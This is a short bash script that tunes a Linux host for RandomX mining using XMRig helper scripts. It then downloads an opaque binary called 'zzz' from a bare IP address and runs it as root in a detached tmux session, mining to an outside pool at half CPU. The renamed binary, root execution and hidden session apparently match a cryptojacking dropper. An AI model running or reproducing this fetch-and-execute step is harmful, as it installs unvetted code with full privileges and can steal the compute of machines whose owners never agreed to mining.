#!/usr/bin/env bash
sudo apt-get update && apt-get upgrade -y
sudo apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev tmux msr-tools
sudo modprobe msr
sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
sudo wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
sudo chmod +x enable_1gb_pages.sh
sudo chmod +x randomx_boost.sh
sudo bash enable_1gb_pages.sh
sudo bash randomx_boost.sh
sudo wget http://51.38.98.168/papa/zzz
sudo chmod +x zzz
tmux new-session -d -s a 'sudo ./zzz -o devilmpro.tech:3330 --max-cpu-usage=50 --donate-level 0 --nicehash --randomx-1gb-pages --rig-id=US24SEPCH'

